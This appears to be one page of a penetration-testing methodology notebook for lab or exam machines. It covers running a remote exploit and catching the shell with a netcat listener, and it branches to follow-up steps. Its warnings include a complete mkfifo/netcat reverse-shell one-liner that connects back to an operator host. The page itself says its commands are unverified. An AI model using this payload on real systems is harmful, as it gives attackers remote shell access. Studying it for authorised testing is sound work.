# Linux - RCE to Shell

**Step 11 of 50 · Linux**

*Run a confirmed remote exploit and catch the resulting shell.*

## Run this

```bash
nc -lnvp $Lport
perl $ExploitFile $BoxIP
python3 $ExploitFile $BoxIP
```

## Example output

 > *Example shape only: the exact exploit invocation is not yet verified against a real box.*
```
[+] Exploit sent
listening on 0.0.0.0 $Lport ...
connect to 10.10.10.1 from 10.10.10.2
$ whoami
username
```
## What did you get?

- [ ] A reverse shell connects to the listener → **Go to Step 12 · [[Linux - Shell Stabilise]]**
- [ ] The exploit opens a bind shell on the target → **Connect with `nc -nv $BoxIP <port>` then go to Step 12 · [[Linux - Shell Stabilise]]**
- [ ] The shell comes back as root → **Skip privesc — grab the flag and go to Step 21 · [[Linux - Clean Down]]**
- [ ] The exploit returns an error → **Go to Step 10 · [[Linux - Exploit Search]]**
- [ ] A shell connects but has no job control → **Go to Step 12 · [[Linux - Shell Stabilise]]**
- [ ] No callback after multiple attempts → **Check firewall — target may block outbound. Try a bind shell, or a different port (443, 8080)**

## Notes

Only run the interpreter command that matches the exploit file. For reverse shells use RevShells to generate the payload matching the available interpreter (`bash`, `python3`, `perl`, `php`).

## Gotcha

> [!warning] 💡
> The exact exploit invocation depends on the discovered service. If it was not tested in the write-ups, confirm it before relying on it.

> [!warning] 💡
> If the payload uses `/dev/tcp` syntax, it requires bash. Shells that run via `/bin/sh` (e.g. from PostgreSQL `COPY TO PROGRAM`, some CGI handlers) will silently fail on bash-only payloads. Use a mkfifo or nc-based payload instead: `rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $LocalIP $Lport > /tmp/f`

> [!warning]
> Command not yet verified against a real box. Confirm the exact exploit interpreter, arguments, and listener port before relying on this page in an exam.
